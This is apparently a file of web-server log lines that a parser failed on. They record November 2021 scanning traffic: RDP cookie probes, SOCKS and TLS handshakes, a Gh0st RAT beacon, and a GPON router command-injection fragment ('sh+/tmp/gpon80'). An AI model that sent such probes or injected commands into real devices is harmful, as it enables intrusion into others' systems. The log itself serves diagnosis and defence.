7@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
7838@@80.82.77.139 - - [20/Nov/2021:12:57:15 +0000] "\x03\xAA\xF0\x98a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
7878@@66.240.205.34 - - [20/Nov/2021:15:09:06 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
7992@@193.32.164.16 - - [20/Nov/2021:20:18:53 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
8038@@52.55.215.86 - - [20/Nov/2021:22:07:59 +0000] "" 400 0 "-" "-"@@list index out of range
8040@@94.232.43.63 - - [20/Nov/2021:22:15:01 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8041@@94.232.43.63 - - [20/Nov/2021:22:15:01 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8139@@5.188.210.227 - - [19/Nov/2021:01:47:39 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
8140@@5.188.210.227 - - [19/Nov/2021:01:48:50 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
8229@@5.188.210.227 - - [19/Nov/2021:06:44:07 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
8230@@5.188.210.227 - - [19/Nov/2021:06:45:25 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
8234@@34.77.162.12 - - [19/Nov/2021:07:06:27 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03g\x1D\xC8(\xBD\xEA1\xD1:\xEF~d\x7F\x84\x0F\x9A2[\xC6\xCC\xC4d\x1A-\x96\xA1\x0EcQ\x114u\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
8301@@142.93.148.236 - - [19/Nov/2021:08:44:18 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03\xAE_B-B\xB8h\xBAo)\x13ekvs?\xDFY\x88\xA3\xBB\xB8X\xDA\xCCl\xA6)!\xF9" 400 166 "-" "-"@@list index out of range
8690@@5.135.42.95 - - [19/Nov/2021:12:37:08 +0000] "" 400 0 "-" "-"@@list index out of range
8820@@185.254.31.134 - - [19/Nov/2021:21:43:48 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\x14O\xC1\xD0\xB6=\x8D\xD5\xEA\xB59\xE9A\x9D\x80\xC5y&\xFE\xC4" 400 166 "-" "-"@@list index out of range
8824@@181.214.206.52 - - [19/Nov/2021:21:52:22 +0000] ":\x92T\x05ib\xE8\x0Ek_V\x08\xDD=x\xAB\xC2\x13\x22\xB88\x1B\x01\x07\xA6\xB1~\xE0Ap\x8D\x96\xF3 \xB9\xDB\x0CEN#5h[\xE4\xC5\x16\xF7wBr=\xB1" 400 166 "-" "-"@@list index out of range
8885@@195.133.18.100 - - [19/Nov/2021:22:43:05 +0000] "" 400 0 "-" "-"@@list index out of range
8924@@157.230.143.29 - - [18/Nov/2021:00:47:06 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x87b\x7F\xCE$GNa\x00\x0E\xC6^\x5C\xA3DW\xD9\xD4\x1C\x13\xC1,2{\xEC\xABE?[x\x0E\xEC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
8941@@185.254.31.134 - - [18/Nov/2021:01:14:54 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\xAB\xFB*v\xD2\xCD\x8BK\xD6\xE9\xBE\xE0\xEF\x13\xD2F>\xD4\x89\xF7P\xC7\xAF\xFF\x99L\xE9:(f\x19\x97 \xD8\xDA\x98\xD0Wfe\xF7\xC2![,4\x7F\xF6j\x90\xBC\x99\xB4\x02\xC5T\x07\x84S\x5C\xEA\xCE\xF0y\xA1\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
8982@@36.255.90.219 - - [18/Nov/2021:02:25:54 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
9025@@205.185.124.100 - - [18/Nov/2021:03:29:05 +0000] "" 400 0 "-" "-"@@list index out of range
9054@@20.55.53.144 - - [18/Nov/2021:06:40:59 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03`q\x81\xFA\xFD\xFB%\xF5\xCB`\xEEu\x17E\xAD\xE5\x8A\xDF\xE3\x81\x0CH\x8E\x05\x0E*\xFF[\xE6\x9EN\xE0 \xD1\xEB\xFA\xDA\xA4\xF8\xBFVPte\xF8&\x94\x89\xD1DN\x8D\x18\xF9aR  \xC5{Yt#\xED@\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
9353@@89.248.165.52 - - [18/Nov/2021:17:32:24 +0000] "\x04\x01\x00\x19h/;\xA1\x00" 400 166 "-" "-"@@list index out of range
9354@@89.248.165.52 - - [18/Nov/2021:17:32:24 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
9357@@20.55.53.144 - - [18/Nov/2021:17:40:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xD1t4P\xF9\x9C\xAF\xD9\xB3\x1B\x14\xAFmz\x81\xA6X\xAB\x15\xAD" 400 166 "-" "-"@@list index out of range
9359@@20.55.53.144 - - [18/Nov/2021:17:52:35 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03/\xD1\xAC\xB4kT\xC1\xEE\xF6\x04\x8AL\xEE\xB9\x973w\x94Wl\xE3\x9C\xD2b\xCA\xAD\x97\x00\xD2\xF5\x19\xF2 B\x98\xD1\x8C\x03\xA6\x9EM\xD7te\x89\x19\xBA\xD45\xF8\xACXM\xAA\x89\xA9\xB3\x01\x22\xAA+\xED\xB3\x8C[\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
9368@@209.141.54.186 - - [18/Nov/2021:18:37:38 +0000] "" 400 0 "-" "-"@@list index out of range
9392@@89.248.165.52 - - [18/Nov/2021:21:11:00 +0000] "\x04\x01\x00PU\xCE\xA0s\x00" 400 166 "-" "-"@@list index out of range
9393@@89.248.165.52 - - [18/Nov/2021:21:11:00 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
9472@@2021/11/27 03:37:21 [crit] 60954#60954: *197960 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 184.105.247.194, server: 0.0.0.0:443@@list index out of range
9473@@2021/11/26 03:36:36 [crit] 60954#60954: *197032 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 184.105.139.69, server: 0.0.0.0:443@@list index out of range
9474@@2021/11/26 04:30:37 [crit] 60954#60954: *197064 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 185.220.100.255, server: 0.0.0.0:443@@list index out of range
9475@@2021/11/26 05:32:35 [crit] 60954#60954: *197121 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 183.136.225.9, server: 0.0.0.0:443@@list index out of range
9476@@2021/11/26 18:46:42 [crit] 60954#60954: *197688 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 178.73.215.171, server: 0.0.0.0:443@@list index out of range
9477@@2021/11/26 20:36:56 [crit] 60954#60954: *197758 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 71.6.158.166, server: 0.0.0.0:443@@list index out of range
9478@@2021/11/26 21:43:17 [crit] 60954#60954: *197803 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 161.35.188.242, server: 0.0.0.0:443@@list index out of range
9479@@2021/11/26 23:41:25 [crit] 60954#60954: *197864 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 192.241.213.250, server: 0.0.0.0:443@@list index out of range
